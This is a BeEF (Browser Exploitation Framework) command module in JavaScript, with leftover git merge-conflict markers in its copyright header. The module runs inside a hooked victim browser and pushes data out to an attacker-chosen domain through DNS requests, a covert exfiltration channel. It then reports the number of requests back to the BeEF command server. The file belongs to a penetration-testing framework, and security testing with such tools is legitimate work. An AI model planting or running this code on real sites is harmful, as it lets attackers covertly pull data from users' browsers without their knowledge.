//
<<<<<<< HEAD
// Copyright (c) 2006-2026Wade Alcorn - wade@bindshell.net
=======
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
>>>>>>> c308392cb3a7bf9025c661931b553d9835aacdcb
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*
Check the Browser Hacker's Handbook, chapter 3, pages 89-95 for more details about how this works.
*/

beef.execute(function() {

	var msgId   = "<%= @command_id %>";
	var domain  = "<%= @domain %>";
	var data = "<%= @data %>";
                                                    //chunks comes from the callback
	beef.net.dns.send(msgId, data, domain, function(chunks){
          beef.net.send('<%= @command_url %>', <%= @command_id %>, 'dns_requests='+chunks+' requests sent');
        }
    );

});

